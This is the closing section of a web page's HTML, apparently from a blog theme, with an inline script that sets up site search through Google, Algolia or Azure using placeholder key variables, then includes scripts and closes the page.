  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
